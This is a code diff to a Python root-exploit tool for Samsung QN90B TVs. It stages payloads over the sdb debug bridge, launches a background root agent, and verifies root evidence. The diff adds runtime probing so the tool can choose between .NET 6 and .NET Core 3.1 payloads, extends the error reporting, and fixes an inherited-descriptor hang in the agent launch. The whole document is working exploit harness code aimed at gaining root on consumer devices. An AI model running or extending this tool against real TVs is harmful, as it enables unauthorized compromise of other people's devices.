@@ -56,6 +56,7 @@ UEP_GATE_PHYSICAL = "0x208c26c4"
 UEP_GATE_CLOSED = "0x00000001"
 UEP_GATE_OPEN = "0x00000000"
 STOCK_SOCAT = PurePosixPath("/opt/usr/apps/com.samsung.tizen.smartthings-hub/bin/socat")
+ACTIVE_RUNTIME_PROBE = "readlink -f /usr/share/dotnet.tizen/netcoreapp"
 
 
 class Qn90bError(RuntimeError):
@@ -90,9 +91,18 @@ class Qn90bRootExploit:
         payload_directory: Path,
         *,
         sdb_timeout: float = 15.0,
+        legacy_payload_directory: Path | None = None,
     ) -> None:
         self.tv_host = tv_host
         self.payload_directory = payload_directory.resolve()
+        # Optional .NET Core 3.1 alternative to the stock .NET 6 payloads,
+        # supplied by the default CLI/controller wiring. The stock payloads
+        # abort with a System.Runtime 6.0.0.0 FileLoadException on a 3.1 CLR.
+        self.legacy_payload_directory = (
+            legacy_payload_directory.resolve()
+            if legacy_payload_directory is not None
+            else None
+        )
         self.sdb = SdbClient(find_sdb(), tv_host, timeout=sdb_timeout)
 
     def preflight(
@@ -127,7 +137,19 @@ class Qn90bRootExploit:
                 assessment.require_compatible()
         except TargetCompatibilityError as error:
             raise Qn90bError(str(error)) from error
+        self._select_payload_runtime()
         return assessment
+
+    def _select_payload_runtime(self) -> None:
+        if self.legacy_payload_directory is None:
+            return
+        result = self.sdb.capture(ACTIVE_RUNTIME_PROBE, timeout=15.0)
+        output = result.output.split("[exit:", 1)[0].strip()
+        active = PurePosixPath(output.splitlines()[-1].strip()).name if output else ""
+        # Only switch when a .NET Core 3.1 CLR is positively identified; any
+        # other outcome keeps the existing .NET 6 payload set.
+        if active.startswith("3.1.") and active[4:].isdigit():
+            self.payload_directory = self.legacy_payload_directory
 
     def stage(self) -> None:
         required = {
@@ -148,10 +170,15 @@ class Qn90bRootExploit:
             name for name in required if not (self.payload_directory / name).is_file()
         )
         if missing:
+            build_target = (
+                "qn90b31-payload"
+                if self.payload_directory == self.legacy_payload_directory
+                else "qn90b-payload"
+            )
             raise Qn90bError(
                 "missing built QN90B payloads: "
                 + ", ".join(missing)
-                + "; run make payloads"
+                + f"; run make {build_target}"
             )
         self.sdb.connect()
         result = self.sdb.inject(f"/bin/mkdir -p {REMOTE_DIRECTORY}")
@@ -174,7 +201,15 @@ class Qn90bRootExploit:
             )
         )
         result = self.sdb.capture(invocation, timeout=timeout)
-        Qn90bRootEvidence(result.output).validate()
+        try:
+            Qn90bRootEvidence(result.output).validate()
+        except Qn90bError as error:
+            output = result.output.strip()
+            if len(output) > 1500:
+                output = "..." + output[-1500:]
+            raise Qn90bError(
+                f"{error}; payload output: {output or 'none'}"
+            ) from error
         return result
 
     def read_uep_gate(self) -> CaptureResult:
@@ -254,6 +289,7 @@ class Qn90bRootSessionConfig:
     accept_timeout: float
     command_timeout: float
     payload_directory: Path
+    legacy_payload_directory: Path | None = None
     sdb_timeout: float = 15.0
 
 
@@ -279,6 +315,7 @@ class Qn90bRootAcquirer:
             config.tv_host,
             config.payload_directory,
             sdb_timeout=config.sdb_timeout,
+            legacy_payload_directory=config.legacy_payload_directory,
         )
 
     async def acquire(self) -> Qn90bRootLease:
@@ -313,7 +350,12 @@ class Qn90bRootAcquirer:
                             str(REMOTE_DIRECTORY),
                         )
                     )
-                    + f" >{shlex.quote(str(remote_log))} 2>&1 </dev/null &"
+                    # Close the capture channel in the background agent. .NET 6
+                    # closes inherited descriptors in child processes, but .NET
+                    # Core 3.1 leaves them open; without this the agent keeps
+                    # the capture socket open and the launch capture never
+                    # reaches EOF even though the agent connected successfully.
+                    + f" >{shlex.quote(str(remote_log))} 2>&1 </dev/null 3>&- &"
                 )
                 launch = asyncio.create_task(
                     asyncio.to_thread(
